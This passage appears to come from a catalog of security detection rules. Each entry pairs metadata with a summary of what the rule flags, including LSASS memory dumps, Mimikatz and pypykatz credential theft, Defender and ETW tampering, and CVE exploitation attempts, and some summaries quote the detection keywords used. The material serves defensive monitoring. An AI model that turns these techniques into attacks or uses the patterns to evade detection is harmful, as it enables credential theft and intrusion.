  Updated-Date: '2024_09_04'
a2910908-e86f-4687-aeba-76a5f996e652:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 129fe5042694994bb94e01fbab3d29b6
  Ruleset: sigmahq
  Summary: This rule detects the use of register-cimprovider.exe to execute an arbitrary
    DLL file. The process is flagged by identifying instances where the image path
    ends with register-cimprovider.exe and the command line includes both '-path'
    and 'dll'. This method is associated with defense evasion techniques and is identified
    as a tactic used for executing untrusted code to maintain persistence on a Windows
    operating system.
  Updated-Date: '2024_09_04'
a29808fd-ef50-49ff-9c7a-59a9b040b404:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6bd7dccfaefaf924abe49d42be3c1772
  Ruleset: core
  Summary: This rule detects the usage of "pypykatz," a tool designed to obtain stored
    credentials. Adversaries may utilize pypykatz to extract credential material from
    the Security Account Manager (SAM) database, which can be accessed through the
    Windows registry where the SAM database is stored. The detection focuses on the
    process creation events involving pypykatz.exe or python.exe, particularly when
    the command line contains the terms 'live' and 'registry'.
  Updated-Date: '2024_09_03'
a2a3b925-7bb0-433b-b508-db9003263cc4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a9c4ea42c7c9adad61ef810bc7e7dedd
  Ruleset: sigmahq
  Summary: This rule detects the loading of the DSParse DLL by a Microsoft Office
    application. It monitors image load events in Windows for specific Office executable
    files such as Excel (excel.exe), Publisher (mspub.exe), OneNote (onenote.exe),
    Outlook (outlook.exe), PowerPoint (powerpnt.exe), and Word (winword.exe). The
    presence of the DSParse DLL being loaded by these Office applications could indicate
    an attempt to exploit Active Directory functionalities through these applications,
    suggesting potentially malicious activity.
  Updated-Date: '2024_09_04'
a2a9d722-0acb-4096-bccc-daaf91a5037b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4058c272d0045d24f228c093cdc4a114
  Ruleset: emerging-threats
  Summary: This rule detects the successful exploitation of a vulnerability in Microsoft
    Exchange as reported in CVE-2021-28480. It identifies specific web server activities
    where the URI query contains "/owa/calendar/a" and the HTTP method is "POST,"
    while excluding events with a status code of 503. This monitoring aims to reveal
    unauthorized access attempts leveraging this particular security flaw in Exchange
    servers.
  Updated-Date: '2024_09_03'
a2bcca38-9f3a-4d5e-b603-0c587e8569d7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d5c7af19107d228a3b11288557018202
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of CVE-2023-43261, which involves
    information disclosure vulnerabilities in Milesight industrial routers, specifically
    models UR5X, UR32L, UR32, UR35, and UR41, prior to firmware version v35.3.0.7.
    The vulnerability allows attackers to access sensitive router components through
    access logs, potentially exposing critical information. The detection mechanism
    focuses on specific HTTP GET requests targeting the router's logs, especially
    those that contain valuable data like passwords. It is essential to collect access
    logs from the router to identify these exploitation attempts effectively.
  Updated-Date: '2024_09_03'
a2cb56ff-4f46-437a-a0fa-ffa4d1303cba:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7c9c052ca0b890d5600164ed21ab6f6d
  Ruleset: core
  Summary: This rule detects user activity in Azure Active Directory that is either
    unusual for the user or consistent with known attack patterns, indicating potential
    threats. It utilizes Azure AD threat intelligence to identify and flag risky sign-in
    activities that may signify security incidents, such as attack persistence, defense
    evasion, privilege escalation, or initial access attempts. The detection is based
    on the risk event type associated with investigations of threat intelligence.
    False positives may occur, and it is recommended to investigate flagged sessions
    in the context of the user's other sign-ins.
  Updated-Date: '2024_09_03'
a2cee20b-eacc-459f-861d-c02e5d12f1db:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f86a0d59e8a0da22dcba9287e34947a
  Ruleset: emerging-threats
  Summary: This rule detects access to the SUPERNOVA webshell, which is associated
    with SolarWinds software, by monitoring specific URL query patterns such as 'logoimagehandler.ashx'
    and 'clazz'. It looks for instances where these patterns occur or when 'logoimagehandler.ashx'
    results in a status code 500 in web server logs. The detection aims to identify
    unauthorized or suspicious activity linked to this threat, helping to mitigate
    persistence techniques used by attackers.
  Updated-Date: '2024_09_03'
a2e5019d-a658-4c6a-92bf-7197b54e2cae:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7ca9647f6dd4a7881351ff84403d72f3
  Ruleset: core
  Summary: This rule detects the installation of PowerShell scripts as a Windows service
    by monitoring events logged by the Service Control Manager. Specifically, it looks
    for instances where the ImagePath contains references to 'powershell' or 'pwsh',
    captured in Event ID 7045. This activity is associated with the technique T1569.002,
    indicating a potential execution of malicious scripts via service installation.
  Updated-Date: '2024_09_03'
a2e97350-4285-43f2-a63f-d0daff291738:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7efc2a3d670296791e1faf7dedb1cdcc
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts targeting Fortinet SSL VPNs by
    identifying specific URL query patterns indicative of CVE-2018-13379. This vulnerability
    allows unauthorized access to sensitive files, potentially leading to significant
    security breaches. Detection focuses on identifying unusual URL requests within
    the webserver logs that contain directory traversal sequences and references to
    SSL VPN sessions.
  Updated-Date: '2024_09_03'
a2ea3ae7-d3d0-40a0-a55c-25a45c87cac1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c769dc7886de97fae6dd73dae9284576
  Ruleset: sigmahq
  Summary: This rule detects the installation of potentially suspicious drivers using
    the pnputil.exe utility on Windows systems. It focuses on specific command-line
    arguments associated with driver installation, such as '-i', '/install', '-a',
    and '/add-driver'. The rule triggers when these arguments are used with pnputil.exe,
    commonly employed by administrators for driver management. However, its use by
    unauthorized users or from unexpected contexts may indicate malicious activity
    and should be further investigated to avoid false positives.
  Updated-Date: '2024_09_04'
a2edbce1-95c8-4291-8676-0d45146862b3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6bfe9bdcfd05b914b6c17722c3dd33b3
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading involving "SolidPDFCreator.dll"
    by monitoring for the loading of this specific DLL file. It distinguishes legitimate
    instances, where "SolidPDFCreator.dll" is loaded by "SolidPDFCreator.exe" from
    standard installation paths, from potentially malicious activities, which involve
    loading the DLL from unconventional locations. This technique is associated with
    malware, particularly highlighting campaigns by Mustang Panda, which can lead
    to defense evasion and privilege escalation.
  Updated-Date: '2024_09_04'
a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 06a615204428838098d5bf4796bc44be
  Ruleset: core
  Summary: This rule detects commands that indicate the removal of Raccine, a free
    ransomware protection tool, from a Windows end system. It identifies specific
    command-line activities, such as using taskkill to terminate RaccineSettings.exe,
    using reg.exe to delete registry entries associated with Raccine Tray, and using
    schtasks to delete scheduled tasks related to Raccine Rules Updater. These activities
    may constitute an attempt to evade defense mechanisms by disabling ransomware
    protection.
  Updated-Date: '2024_09_03'
a33f8808-2812-4373-ae95-8cfb82134978:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a6ceb56af17f08010000195799ec81ed
  Ruleset: sigmahq
  Summary: This rule detects the deletion of a Windows Defender exclusion. This activity
    could signify that an attacker is attempting to cover their tracks by removing
    previously added exclusions to evade detection.
  Updated-Date: '2024_09_04'
a34f79a3-8e5f-4cc3-b765-de00695452c2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28bdced495ec137c78b95ea1e773e7c8
  Ruleset: core
  Summary: This rule detects the execution of the tool PowerTool, which has capabilities
    to kill processes, delete process files, unload drivers, and delete driver files.
    This tool can be used for malicious purposes such as defense evasion and tampering
    with system operations.
  Updated-Date: '2024_09_03'
a3501e8e-af9e-43c6-8cd6-9360bdaae498:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 507e15094c6ecdcd8b99c08863fc8e0c
  Ruleset: sigmahq
  Summary: This rule detects activity from IP addresses deemed risky by Microsoft
    Threat Intelligence for a Microsoft Cloud App Security reported user. These suspicious
    IP addresses could be engaged in malicious activities such as Botnet Command and
    Control (C&C), potentially indicating a compromised account. The detection focuses
    on events sourced from the Security Compliance Center where the event name is
    "Activity from suspicious IP addresses" and the status is successful.
  Updated-Date: '2024_09_04'
a35c97c8-d9c4-4c89-a3e7-533dc0bcb73a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11b5c14d37ebad2c16b70fdde2bea5e7
  Ruleset: emerging-threats
  Summary: This rule detects command lines that contain references to files ending
    with a period ('.'), a technique associated with the Raspberry Robin malware.
    Raspberry Robin is known to utilize this specific file naming scheme in its operations.
  Updated-Date: '2024_09_03'
a35f5a72-f347-4e36-8895-9869b0d5fc6d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 49fc2b786f61c0812e8902f85a8e895d
  Ruleset: core
  Summary: This rule detects the use of the Netsh command to whitelist a program in
    the Windows Firewall when the program is located in a potentially suspicious directory
    such as system directories or user temporary folders. The intent is to identify
    actions where malicious programs attempt to evade detection by being granted firewall
    permissions. The Netsh commands checked involve adding a program to the allowed
    list of the firewall or creating a new allow rule for the firewall. Specific directories
    monitored include locations like the Recycle Bin, System Volume Information, Windows
    system folders, user temp folders, the Users directory, and other commonly abused
    paths. This behavior is often associated with malware such as Win32/Kasidet.AD.
  Updated-Date: '2024_09_03'
a36ce77e-30db-4ea0-8795-644d7af5dfb4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c926fb1b80a489f015b309cf1249c30e
  Ruleset: emerging-threats
  Summary: This rule detects the download of Ursnif malware through dropper documents
    by identifying specific URL patterns in proxy logs. It looks for URLs containing
    certain substrings, such as "/" and ".php?l=", and ending with ".cab", along with
    a successful HTTP status code of 200. Ursnif is a type of malware typically used
    to steal sensitive information, including banking login details.
  Updated-Date: '2024_09_03'
a383dec4-deec-4e6e-913b-ed9249670848:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6844fa77acce6b1b1da795cbeed9f345
  Ruleset: core
  Summary: This rule detects enabling of developer features in Windows, such as "Developer
    Mode" or "Application Sideloading," which allow installation of untrusted packages.
    This activity is associated with possible defense evasion tactics. It monitors
    the execution of `SystemSettingsAdminFlows.exe` and specific command line arguments
    related to turning on developer features and enabling sideloading.
  Updated-Date: '2024_09_03'
a39d7fa7-3fbd-4dc2-97e1-d87f546b1bbc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7b3dcd2c96618a5191072addabfde754
  Ruleset: sigmahq
  Summary: This rule detects program executions occurring in suspicious non-program
    folders on Linux systems, which may indicate malware or hacking activity. The
    rule covers directories often associated with inappropriate or malicious use,
    including temporary folders, web server directories, and data directories typically
    exploited by services like PostgreSQL, MySQL, FTP servers, and DNS servers. Examples
    of such directories include '/tmp/', '/var/www/', '/home/*/public_html/', and
    '/usr/local/mysql/data/'. The rule is designed to identify unauthorized or unexpected
    program executions that might signify an attack or compromise.
  Updated-Date: '2024_09_04'
a3ab73f1-bd46-4319-8f06-4b20d0617886:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e7bede917746201f7a9a7911ac3dbdbb
  Ruleset: core
  Summary: This rule detects modifications to Windows Defender Exploit Guard's "ProtectedFolders"
    or "AllowedApplications" settings. Such changes include adding or removing applications
    or folders from these configurations. The detection mechanism triggers when the
    antimalware platform configuration changes, with specific attention to events
    indicating changes in the "AllowedApplications" paths or "ProtectedFolders" settings.
    This rule helps identify potential defense evasion techniques by monitoring critical
    changes within Windows Defender's controlled folder access settings.
  Updated-Date: '2024_09_03'
a3f55ebd-0c01-4ed6-adc0-8fb76d8cd3cd:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7ea4e23a140f268723f27be3bda7054
  Ruleset: core
  Summary: This rule detects sign-in events from a known malicious IP address, characterized
    by a high rate of login failures. The detection is specifically targeted at identifying
    potential command-and-control activities within Azure environments. In the event
    of such detections, further investigation of the flagged sessions in the context
    of other user sign-ins is recommended.
  Updated-Date: '2024_09_03'
a3f5c081-e75b-43a0-9f5b-51f26fe5dba2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e9bce14d927bfc18a1ac93056b5cb1c2
  Ruleset: core
  Summary: This rule detects potential suspicious Winget package installations originating
    from untrusted sources. Winget is a Windows Package Manager that facilitates software
    installations, and the detection focuses on files that begin with certain ZoneTransfer
    identifiers and contain specified URL patterns within temporary directories. These
    patterns indicate that the files might have been downloaded from potentially risky
    external sources, highlighting the possibility of a defense evasion or persistence
    tactic.
  Updated-Date: '2024_09_03'
a4694263-59a8-4608-a3a0-6f8d3a51664c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 204240dc2204f253c1f4ff16b2a023f2
  Ruleset: core
  Summary: This rule detects the usage of the Stored User Names and Passwords dialogue,
    also known as Key Manager, by monitoring the execution of 'rundll32.exe' with
    command-line arguments containing 'keymgr' and 'KRShowKeyMgr'. While legitimate
    administrative activities can trigger this, it often indicates credential access
    attempts.
  Updated-Date: '2024_09_03'
a46c93b7-55ed-4d27-a41b-c259456c4746:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77fe6d1caff568f57dfbaec60d453c99
  Ruleset: core
  Summary: This rule detects process connections to Monero cryptocurrency mining pools
    on Linux systems. It identifies specific destination hostnames associated with
    Monero mining, such as 'pool.minexmr.com', 'xmr.nanopool.org', and others. This
    detection can help identify unauthorized or malicious crypto mining activities,
    although legitimate use of crypto miners might also trigger the rule.
  Updated-Date: '2024_09_03'
a4824fca-976f-4964-b334-0621379e84c4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ae8729e1ed6248f3ffb00a8855c164b9
  Ruleset: core
  Summary: This rule detects the use of Sysinternals SDelete, a utility for secure
    file deletion on Windows, specifically targeting scenarios where it is used to
    erase a file rather than free space. The detection focuses on instances where
    the executable name "sdelete.exe" appears in the process creation logs, while
    filtering out benign uses involving the command line parameters for help, secure
    overwrite, or zeroing free space.
  Updated-Date: '2024_09_03'
a49fa4d5-11db-418c-8473-1e014a8dd462:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 020b79ee5386e336b5425bb50555a172
  Ruleset: core
  Summary: This rule detects adversaries leveraging the MiniDump export function from
    comsvcs.dll via rundll32 to perform a memory dump from the Local Security Authority
    Subsystem Service (lsass.exe) on Windows systems. This technique is often used
    to obtain sensitive information such as credentials by exploiting the lsass process,
    which handles security policies and user authentication. The detection criteria
    include the presence of the lsass process and rundll32 executing comsvcs.dll,
    which indicates a potential memory dump activity.
  Updated-Date: '2024_09_03'
a4a899e8-fd7a-49dd-b5a8-7044def72d61:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 887d630e7a42c798fd1fbe6b52b81550
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of CVE-2010-5278, specifically
    targeting a local file inclusion vulnerability in MODx Revolution 2.0.2-pl. When
    the PHP configuration option 'magic_quotes_gpc' is disabled, remote attackers
    can leverage a directory traversal flaw through the 'class_key' parameter in 'manager/controllers/default/resource/tvs.php'
    to read arbitrary files. The detection is based on observing specific patterns
    in the web server query, particularly those involving traversal sequences aimed
    at accessing system files like 'win.ini'.
  Updated-Date: '2024_09_03'
a4b25073-8947-489c-a8dd-93b41c23f26d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 66570c508bb2844ba911f960a07bd5fc
  Ruleset: sigmahq
  Summary: This rule detects when an account retrieves the Local Administrator Password
    Solution (LAPS) password from Microsoft Entra ID. LAPS is a feature that helps
    manage the local administrator passwords of devices, ensuring they are secure
    and regularly updated. The rule monitors Azure audit logs for activities indicating
    the successful recovery of a local credential by a device ID, which could potentially
    signify unauthorized access attempts or credential theft.
  Updated-Date: '2024_09_04'
a4c90ea1-2634-4ca0-adbb-35eae169b6fc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cac820b65f068cd86e417aa390407bf5
  Ruleset: core
  Summary: This rule detects attempts to disable Event Tracing for Windows (ETW) logging
    within .NET processes by monitoring specific registry modifications. ETW is a
    mechanism provided by Microsoft Windows allowing efficient logging to troubleshoot
    performance issues, specifically for .NET assemblies. Adversaries can disable
    ETW in order to evade detection during their activities. The registry changes
    being monitored include setting 'ETWEnabled' in the .NET Framework registry path
    to 0, and changing 'COMPlus_ETWEnabled' or 'COMPlus_ETWFlags' under the Environment
    registry path to 0. Detecting these changes is crucial for identifying and responding
    to potential defense evasion tactics.
  Updated-Date: '2024_09_03'
a4e068b5-e27c-4f21-85b3-e69e5a4f7ce1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9a00af1b63edca769ae076d6fa6a00f1
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit CVE-2023-4966, a vulnerability in
    Citrix ADC and NetScaler Gateway that can lead to sensitive information disclosure.
    The detection is based on webserver logs, specifically looking for an exceptionally
    long host header string in GET requests to the path "/oauth/idp/.well-known/openid-configuration".
    This pattern can signify an exploitation attempt of the vulnerability mentioned.
  Updated-Date: '2024_09_03'
a4e3d776-f12e-42c2-8510-9e6ed1f43ec3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2f0a999d7778e0401e5ad83863a113bb
  Ruleset: core
  Summary: This rule detects an unexpected process originating from dns.exe, which
    may signify remote code execution or other exploitative activities linked to CVE-2020-1350
    (SigRed).
  Updated-Date: '2024_09_03'
a4eaf250-7dc1-4842-862a-5e71cd59a167:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 082c998833eb14084c9fc1ef9a317954
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a subprocess by explorer.exe under the
    context of the RazerInstaller software. The RazerInstaller, typically used for
    selecting a different installation folder, can be exploited to escalate privileges
    to LOCAL SYSTEM. This detection focuses on identifying when this subprocess runs
    with system integrity, potentially indicating an attempt to misuse the installer
    for privilege escalation.
  Updated-Date: '2024_09_03'
a537cfc3-4297-4789-92b5-345bfd845ad0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 92e33187e6b83db85d34160a34649c53
  Ruleset: core
  Summary: This rule detects the use of the "sc.exe" utility to add new services with
    special permissions that make the service hidden and unremovable. Threat actors
    commonly employ this technique to persist on compromised systems, evade defenses,
    and escalate their privileges. The detection focuses on process creation events
    where "sc.exe" is executed with specific command-line arguments indicating an
    attempt to modify service permissions. This kind of activity can be indicative
    of sophisticated attacks aiming to maintain undetected access.
  Updated-Date: '2024_09_03'
a54f842a-3713-4b45-8c84-5f136fdebd3c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e5d709dfa3a54292f29c22107e389bf
  Ruleset: sigmahq
  Summary: This rule detects the creation or modification of a new PortProxy registry
    entry within the Windows operating system. The PortProxy registry key is leveraged
    for port forwarding, which can be an indicator of network manipulation techniques
    often associated with lateral movement, defense evasion, or establishing command
    and control channels. Monitoring this registry key helps in identifying potentially
    malicious activities that might bypass traditional network restrictions, using
    tools or methods commonly noted in threat research and cybersecurity literature.
  Updated-Date: '2024_09_04'
a55349d8-9588-4c5a-8e3b-1925fe2a4ffe:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d8dc6799fae7eb37d05d2380bbeb43a
  Ruleset: core
  Summary: This rule detects the deletion of Exchange PowerShell cmdlet history logs,
    indicating a potential attempt to destroy forensic evidence.
  Updated-Date: '2024_09_03'
a58353df-af43-4753-bad0-cd83ef35eef5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2da9bef3753af58893bb8eaa79e98abc
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Active Directory diagnostic tool
    `ntdsutil.exe`, which is commonly used for actions such as restoring snapshots.
    Monitoring the use of `ntdsutil.exe` is important because it can be leveraged
    for malicious activities, particularly for credential access. The detection focuses
    on process creation events in Windows systems, specifically looking for instances
    where the executable image matches `ntdsutil.exe` or the command line includes
    terms related to snapshot mounting and activation of specific instances of the
    NT Directory Services. Legitimate usage scenarios, such as administrative activities
    or restoring snapshots, are considered potential false positives.
  Updated-Date: '2024_09_04'
a5a2d357-1ab8-4675-a967-ef9990a59391:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 85e645713d7d960d6007fe210061fdad
  Ruleset: core
  Summary: This rule detects the creation of files with names commonly associated
    with various memory dumping tools that create a memory dump of the LSASS (Local
    Security Authority Subsystem Service) process memory, which contains user credentials.
    It specifically identifies files with extensions like `.dmp`, `.zip`, and `.rar`,
    and names such as `lsass.dmp`, `lsass.zip`, `Andrew.dmp`, and others. The detection
    criteria include filename patterns that end with these extensions or contain specific
    substrings like `lsass_2` or `SQLDmpr`. This helps to identify unauthorized memory
    dumps of the LSASS process, which could potentially indicate credential theft
    or other malicious activities.
  Updated-Date: '2024_09_03'
a5a30a6e-75ca-4233-8b8c-42e0f2037d3b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91e4fb11de2df69c103318ed5a2da154
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell scripts that leverage
    the Rundll32 executable for defense evasion and malicious execution. It specifically
    looks for certain keywords within the script block texts, such as "&&", "rundll32",
    "shell32.dll", "shellexec_rundll", as well as additional terms like "value", "invoke",
    "comspec", and "iex". This combination of specific terms in PowerShell script
    executions is indicative of obfuscation techniques used to bypass security measures
    and execute potentially harmful commands on Windows systems.
  Updated-Date: '2024_09_03'
a5b977d6-8a81-4475-91b9-49dbfcd941f7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2fea335711dc1db63bc3f5ae0141b9c4
  Ruleset: sigmahq
  Summary: This rule detects instances where the immutable attribute of a file has
    been removed using the `chattr -i` command on Linux systems. The rule utilizes
    the Linux Auditd service to monitor for such activity, which may be indicative
    of defense evasion tactics.
  Updated-Date: '2024_09_04'
a5c7a43f-6009-4a8c-80c5-32abf1c53ecc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7efcf805afb0bcad8be10618c62cd866
  Ruleset: core
  Summary: This rule detects changes to Microsoft Office protected view registry keys,
    where an attacker disables critical security features designed to protect users.
    It specifically monitors modifications to settings such as disabling protected
    view for attachments opened from Outlook, files downloaded from the Internet,
    files located in UNC paths, and unsafe locations. These changes can compromise
    the security posture of the system by allowing potentially harmful files to be
    accessed without the standard safeguards.
  Updated-Date: '2024_09_03'
a5ea83a7-05a5-44c1-be2e-addccbbd8c03:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba589f96d701b9336750463ab6f964f9
  Ruleset: core
  Summary: This rule detects attempts to execute "dism.exe" while loading a non-standard
    "dismcore.dll" file, indicating a potential bypass of User Account Control (UAC)
    by using a fake DLL. This method could be utilized for persistence, defense evasion,
    and privilege escalation within Windows systems by leveraging the malicious DLL
    to gain elevated privileges.
  Updated-Date: '2024_09_03'
a607e1fe-74bf-4440-a3ec-b059b9103157:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e31b5011f68d06330f7b0b7f5a184ca
  Ruleset: core
  Summary: This rule detects the modification of findings on AWS SecurityHub by identifying
    specific events from CloudTrail logs. Events such as 'BatchUpdateFindings,' 'DeleteInsight,'
    'UpdateFindings,' and 'UpdateInsight' are monitored to identify potential evasion
    attempts. This includes changes to security-related insights and the updating
    or deleting of findings, which may indicate attempts to hide or manipulate security
    issues.
  Updated-Date: '2024_09_03'
a61a3c56-4ce2-4351-a079-88ae4cbd2b58:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e6315b57d4c5426bc17e885d04d9341
  Ruleset: sigmahq
  Summary: This rule detects when an admission controller is executed within Azure
    Kubernetes. An admission controller in Kubernetes intercepts and potentially alters
    requests to the Kubernetes API server, with its behavior guided by user-deployed
    webhooks such as MutatingAdmissionWebhook or ValidatingAdmissionWebhook. Adversaries
    can exploit these webhooks for persistence by modifying pod creation operations
    to include malicious containers or access credentials by intercepting API calls
    and recording sensitive information like secrets.
  Updated-Date: '2024_09_04'
a62298a3-1fe0-422f-9a68-ffbcbc5a123d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba62581ea86ea33b3338860d17726777
  Ruleset: emerging-threats
  Summary: This rule detects suspicious command line patterns associated with MERCURY
    APT activity. The patterns include specific bypass and encoding flags as well
    as base64-encoded PowerShell command fragments typically utilized by this advanced
    persistent threat group to execute scripts and maintain stealth within Windows
    environments. The detection aims to identify malicious command executions indicative
    of MERCURY APT operations, particularly those exploiting Log4j vulnerabilities
    in unpatched systems.
  Updated-Date: '2024_09_03'
a622fcd2-4b5a-436a-b8a2-a4171161833c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c65723afcafdf98c7e7f89d1f299e7c2
  Ruleset: sigmahq
  Summary: This rule detects when users grant access to other users on Azure resources
    from an IP address that has not been previously seen. It aims to identify potential
    unauthorized access by monitoring Microsoft.Authorization/roleAssignments/write
    activities in Azure activity logs.
  Updated-Date: '2024_09_04'
a62b37e0-45d3-48d9-a517-90c1a1b0186b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 30340f64914204469dc8c5387ef3230e
  Ruleset: sigmahq
  Summary: This rule detects the clearing of one of the Windows Eventlogs, which can
    often result from the execution of commands such as "wevtutil cl". This activity
    is associated with defense evasion tactics, particularly those categorized under
    attack techniques aimed at hiding the traces of adversarial actions. The detection
    is based on specific EventID 104 and involves the Microsoft-Windows-Eventlog provider.
    Certain channels like PowerShell and Sysmon logs are excluded from this detection
    as they are covered by a similar rule. False positives may include activities
    such as the rollout of log collection agents or system provisioning, where a system
    reset might occur before creating a golden image of the system.
  Updated-Date: '2024_09_04'
a6355fbe-f36f-45d8-8efc-ab42465cbc52:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6bfaace5aed85b04b8965ccd4401e6ab
  Ruleset: core
  Summary: This rule detects when highly privileged delegated permissions are granted
    on behalf of all users. This activity is significant as it can be indicative of
    a potential security threat if it occurs unexpectedly or without proper authorization,
    allowing broad access across the user base.
  Updated-Date: '2024_09_03'
a642964e-bead-4bed-8910-1bb4d63e3b4d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: decbd999cf7e257abfd2b6151786e462
  Ruleset: core
  Summary: This rule detects the execution of the HackTool Mimikatz by identifying
    specific command line arguments commonly associated with it. Mimikatz is a well-known
    post-exploitation tool used for credential dumping, which can extract plaintext
    passwords, hashes, PINs, and Kerberos tickets from memory. The detection focuses
    on the presence of keywords and functions within the command line that are indicative
    of Mimikatz's various modules and functionalities, including `DumpCreds`, `::memssp`,
    `::printnightmare`, and `sekurlsa::`. The rule helps in identifying potential
    malicious activities related to credential access and dumping in a Windows environment.
  Updated-Date: '2024_09_03'
a66bc059-c370-472c-a0d7-f8fd1bf9d583:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b2e22567916bef1fc5c38c3c99a7ffbc
  Ruleset: core
  Summary: This rule detects network connections initiated by the Equation Editor
    process, "eqnedt32.exe," on Windows systems. The Equation Editor has been exploited
    in various attacks, and network connections from this process could indicate potential
    malicious activity or exploitation attempts.
  Updated-Date: '2024_09_03'
a6976974-ea6f-4e97-818e-ea08625c52cb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d1b2fc32f2902fbfa550dbd00b175dbf
  Ruleset: core
  Summary: This rule detects a potential RipZip attack aimed at the Startup folder
    in Windows, which is initiated through a phishing attack. The attack involves
    a ZIP file containing a malicious shortcut (LNK file). When a user opens the ZIP
    file using the Explorer process, it extracts the malicious content and deposits
    a shortcut leading to a backdoor into the Startup folder. The file name of the
    malicious shortcut includes a specific identifier `{0AFACED1-E828-11D1-9187-B532F1E9575D}`,
    indicating a folder shortcut operation.
  Updated-Date: '2024_09_03'
a699b30e-d010-46c8-bbd1-ee2e26765fe9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ebfda065a01d6f682e41994fe53c7991
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell to store files in Alternate Data
    Streams (ADS), a technique often associated with malware such as Astaroth. The
    detection focuses on specific patterns in the script block text, including the
    use of `Start-Process`, `-FilePath "$env:comspec"`, and `-ArgumentList`. Script
    Block Logging must be enabled to capture these activities. This method is commonly
    used for defense evasion.
